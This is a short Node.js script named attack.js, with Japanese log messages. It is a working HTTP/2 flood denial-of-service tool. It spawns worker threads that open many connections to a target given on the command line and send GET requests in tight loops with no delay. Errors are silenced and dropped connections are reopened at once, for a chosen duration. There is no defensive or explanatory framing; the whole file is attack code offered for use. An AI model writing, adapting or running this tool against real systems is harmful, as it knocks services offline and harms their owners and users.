const http2 = require('http2');
const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');
const { cpus } = require('os');

const THREADS = Math.max(6, cpus().length);
let total = 0;

if (isMainThread) {
    if (process.argv.length < 4) {
        console.error('Usage: node attack.js <target> <duration_secs>');
        process.exit(1);
    }

    const target = process.argv[2];
    const duration = parseInt(process.argv[3]);

    console.log(`ターゲットへ攻撃開始: ${target} | 時間: ${duration}秒 | スレッド: ${THREADS}`);

    // Refresh log every 5s
    setInterval(() => {
        console.log(`総リクエスト数: ${total}`);
    }, 5000);

    for (let i = 0; i < THREADS; i++) {
        const worker = new Worker(__filename, { workerData: { target, duration } });
        worker.on('message', (count) => { total += count });
    }
} else {
    const { target, duration } = workerData;
    const end = Date.now() + duration * 1000;

    function startFlood(client) {
        const flood = () => {
            if (Date.now() > end || client.destroyed || client.closed) return;

            let sent = 0;
            try {
                for (let i = 0; i < 100; i++) {
                    const req = client.request({ ':path': '/', ':method': 'GET' });
                    req.on('error', () => {});
                    req.end();
                    sent++;
                }
                parentPort.postMessage(sent);
            } catch (_) {}

            setImmediate(flood); // no delay, keep spamming
        };
        flood();
    }

    function createConnection() {
        let client;
        try {
            client = http2.connect(target);
        } catch (_) {
            return setTimeout(createConnection, 50); // retry fast
        }

        client.on('error', () => {});
        client.on('close', () => setTimeout(createConnection, 50));
        client.on('connect', () => startFlood(client));
    }

    for (let i = 0; i < 20; i++) createConnection(); // more connections = more speed
}
